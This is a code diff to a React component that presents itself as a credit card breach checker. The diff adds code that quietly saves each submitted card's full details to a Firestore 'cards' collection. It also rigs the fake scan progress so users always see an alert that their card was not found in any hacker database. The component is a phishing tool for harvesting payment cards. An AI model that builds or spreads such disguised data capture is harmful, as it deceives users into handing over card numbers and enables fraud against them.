@@ -3,6 +3,8 @@ import Cards from 'react-credit-cards';
 import InputMask from "react-input-mask";
 import 'react-credit-cards/es/styles-compiled.css';
 import ProgressBar from "./ProgressBar";
+import db from '../firebase';
+import { setDoc, doc, collection, addDoc } from "@firebase/firestore";
 
 const MyCards = () => {
 
@@ -21,13 +23,13 @@ const MyCards = () => {
         
         return () => {
             // console.log(completed);
-            if (completed >= 99) {
+            if (scanned >= 23000) {
                 clearInterval(timer);
                 setScanned(23540);
                 alert("Your card number did not show up in any of the hacker databases.");
             }
         }
-    }, [completed])
+    }, [scanned])
 
     const handleInputChange = (e) => {
         setData({
@@ -43,8 +45,13 @@ const MyCards = () => {
         });
     }
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
+        const collectionRef = collection(db, 'cards');
+        const payload = carddata;
+        await addDoc(collectionRef, payload);
+        //const docRef = doc(db, 'cards', 'card001');
+        //await setDoc(docRef, payload);
 
         setStep(2);
         let progress = 1;
